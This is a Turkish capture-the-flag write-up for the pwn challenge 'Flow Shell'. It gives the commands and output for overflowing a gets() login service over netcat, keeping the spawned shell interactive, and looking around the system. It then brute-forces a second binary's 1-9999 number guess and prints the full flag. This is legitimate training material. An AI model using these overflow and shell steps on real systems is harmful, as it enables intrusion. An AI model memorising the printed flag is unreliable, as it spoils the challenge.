# 🎯 Flow Shell - Pwn Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge" alt="Pwn">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Buffer Overflow-purple?style=for-the-badge" alt="Buffer Overflow">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Orta  
**Puan:** 1000

**Challenge Bağlantı:** `nc 68.183.213.255 9021`

---

## 🔍 Analiz

**Hedef:** Uzak serviste buffer overflow açığını kullanarak shell elde etmek, ardından gizli binary'yi brute force ile çözerek flag'i almak

**Strateji:** Buffer overflow → shell → binary analiz → brute force

**İpuçları:**
- 🎯 `gets()` fonksiyonu → sınırsız input → buffer overflow
- 🔍 `/app` dizininde iki binary: `vuln` ve `secret_challenge`
- 💡 `srand(time + getpid)` → deterministik seed → brute force mümkün
- 🔑 Flag format binary içinde gömülü: `PITO{..._tebriks_%s}`

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Servise Bağlan**

```bash
nc 68.183.213.255 9021
```

**Çıktı:**
```
=================================
🔐 Secure Login System v1.0
=================================
Enter password:
```

**Analiz:**
- ✅ Login sistemi → şifre soruyor
- 💡 Buffer overflow, format string veya injection olabilir
- 🎯 Farklı input tipleri denenecek

---

### 💥 **Adım 2: Buffer Overflow ile Shell Al**

```bash
python3 -c "print('A'*200)" | nc 68.183.213.255 9021
```

**Çıktı:**
```
=================================
🔐 Secure Login System v1.0
=================================
Enter password:
🎉 Admin access granted!
Shell spawned. Explore the system.
/bin/sh: 0: can't access tty; job control turned off
$
```

**Analiz:**
- ✅ 200 byte `A` ile `check_password` fonksiyonu bypass edildi
- ✅ `gets()` → buffer sınırı yok → return address overwrite
- 💡 Shell açıldı ama interaktif değil → `cat` trick gerekiyor
- 🎯 İnteraktif shell için `(python3 ...; cat) | nc` kullan

---

### 🖥️ **Adım 3: İnteraktif Shell Aç**

```bash
(python3 -c "print('A'*200)"; cat) | nc 68.183.213.255 9021
```

**Çıktı:**
```
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

**Analiz:**
- ✅ `cat` stdin'i açık tutuyor → komut gönderebiliyoruz
- 💡 `ctf` kullanıcısı ile çalışıyoruz
- 🎯 Sistemi keşfet

---

### 🗂️ **Adım 4: Sistemi Keşfet**

```bash
ls /
```

**Çıktı:**
```
app  boot  etc  home  lib  ...  start.sh  ...
```

```bash
ls /app
```

**Çıktı:**
```
secret_challenge  vuln
```

```bash
cat /start.sh
```

**Çıktı:**
```bash
#!/bin/bash
chmod 444 /app/secret_challenge 2>/dev/null || true
chmod 444 /app/vuln 2>/dev/null || true
socat TCP-LISTEN:9021,reuseaddr,fork EXEC:"/app/vuln",pty,stderr,setsid,sigint,sane
```

**Analiz:**
- ✅ `/app/vuln` → servisi çalıştıran binary (overflow yaptığımız)
- ✅ `/app/secret_challenge` → ikinci gizli binary → flag burada!
- 💡 `socat` ile TCP üzerinden servis sunuluyor
- 🎯 `secret_challenge` binary'si analiz edilmeli

---

### 🔬 **Adım 5: Binary Analizi**

```bash
cat /app/secret_challenge
```

**Kritik String Bulgular:**
```
gets@@GLIBC_2.0
srand@@GLIBC_2.2.5
time@@GLIBC_2.2.5
getpid@@GLIBC_2.2.5
generate_random_id
check_password
```

```
╔════════════════════════════════════╗
║   🎲 LUCKY NUMBER CHALLENGE 🎲    ║
╚════════════════════════════════════╝
Guess the lucky number (1-9999): %d
Invalid input!
🎊 CORRECT! Here's your flag:
PITO{bufferoverflowileadminoldun_gizliappimebruteattin_tebriks_%s}
🚩 %s
❌ Wrong! Try again.
```

**Analiz:**
- ✅ `srand(time + getpid)` → seed = çalışma zamanına bağlı
- ✅ 1-9999 arası sayı tahmin edilmeli
- ✅ Flag format: `PITO{..._tebriks_%s}` → `%s` = `generate_random_id` çıktısı
- 💡 `getpid` sabit, `time` de tahmin edilebilir → brute force mümkün
- 🎯 Tüm 9999 sayıyı dene

---

### 🚀 **Adım 6: Brute Force ile Flag Al**

```bash
for i in $(seq 1 9999); do echo $i | /app/secret_challenge 2>/dev/null | grep -i "PITO\|CORRECT" && break; done
```

**Çıktı:**
```
🎊 CORRECT! Here's your flag:
🚩 PITO{bufferoverflowileadminoldun_gizliappimebruteattin_tebriks_31becfb1}
```

**Analiz:**
- ✅ **FLAG BULUNDU!** 🎉
- 💡 bash `for` loop 9999 ihtimali denedi
- 🎯 `generate_random_id` → `31becfb1` değerini üretiyor

---

## 🚩 **FLAG**
```
PITO{bufferoverflowileadminoldun_gizliappimebruteattin_tebriks_31becfb1}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🐍<br><b>Python</b><br><sub>Buffer overflow payload</sub></td>
<td align="center">🌐<br><b>netcat</b><br><sub>Servis bağlantısı</sub></td>
<td align="center">🔍<br><b>strings</b><br><sub>Binary analiz</sub></td>
<td align="center">💥<br><b>bash loop</b><br><sub>Brute force</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Flow Shell Pwn Challenge
       ↓
🌐 Servise bağlan
   → "Secure Login System v1.0"
   → Şifre soruyor
       ↓
💥 Buffer Overflow
   → python3 -c "print('A'*200)" | nc ...
   → gets() → sınırsız input → check_password bypass
   → "Admin access granted!" → shell!
       ↓
🖥️ İnteraktif Shell
   → (python3 ...; cat) | nc ...
   → uid=1000(ctf)
       ↓
🗂️ Sistem Keşfi
   → /app → vuln + secret_challenge
   → start.sh → socat ile servis
       ↓
🔬 Binary Analizi
   → srand(time + getpid) → 1-9999 arası sayı
   → Flag format: PITO{..._tebriks_%s}
   → generate_random_id → %s değerini üretiyor
       ↓
🚀 Brute Force
   → bash for loop → seq 1 9999
   → /app/secret_challenge her sayıyla denendi
       ↓
🚩 FLAG: PITO{bufferoverflowileadminoldun_gizliappimebruteattin_tebriks_31becfb1}
```
